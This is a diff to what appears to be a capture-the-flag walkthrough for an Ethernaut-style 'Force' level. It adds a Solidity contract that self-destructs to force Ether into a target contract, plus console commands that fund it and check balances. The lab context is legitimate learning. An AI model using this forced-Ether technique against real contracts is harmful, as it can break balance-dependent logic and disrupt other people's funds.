@@ -294,28 +294,52 @@ Within the [Security Considerations](https://docs.soliditylang.org/en/develop/se
 
 Let’s force Ether into our instance by (1) creating a contract, (2) providing the contract with a balance, and (3) have it `selfdestruct`, with the recipient as our instance. 
 
-Compile in Remix. Deploy without value. 
+  (1) First, we'll create, compile, and deploy the following contract in Remix.
 
 ```solidity
-// Check contract value
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+ 
+ // create new contract 
+ contract ForceFeedEther {
+ 
+// allow receipt of ether
+   
+   receive () external payable {
+   }
+
+// force ether into target contract 
+function boomBoomPow(address payable _targetAddr) public {
+   selfdestruct(_targetAddr);
+}
+}
+```
+(2) Now, we'll provide the contract with a balance. We've included a `receive` function to assist with this.
+
+```js
+// Let's check that our contract value is currently 0
 > toWei(await getBalance('0x7a0bA04E8504Ba2AeAc986656B98b83dE1270b55'))
-⋖ '0' 
+< '0' 
 
 // Send 10 Ether to contract
 > await web3.eth.sendTransaction({to:'0x7a0bA04E8504Ba2AeAc986656B98b83dE1270b55', from:player, value:10})
 
 // Check updated contract value
 > toWei(await getBalance('0x7a0bA04E8504Ba2AeAc986656B98b83dE1270b55'))
-⋖ '10' 
+< '10' 
+```
 
-// Check instance value
+(3) Finally, we'll have the contract `selfdestruct`, with the recipient as our instance. 
+
+```js
+// Confirm the instance value is 0
 > toWei(await getBalance(instance))
-⋖ '0' 
+< '0' 
 
-// Execute `selfdestruct` from Remix, specifying the instance adress as the target address
+// Execute selfdestruct from Remix, specifying the instance address as the target address
 
-// Check updated instance value
+// Check the updated instance value
 > toWei(await getBalance(instance))
-⋖ '10' 
+< '10' 
 ```
 Submit instance for completion.
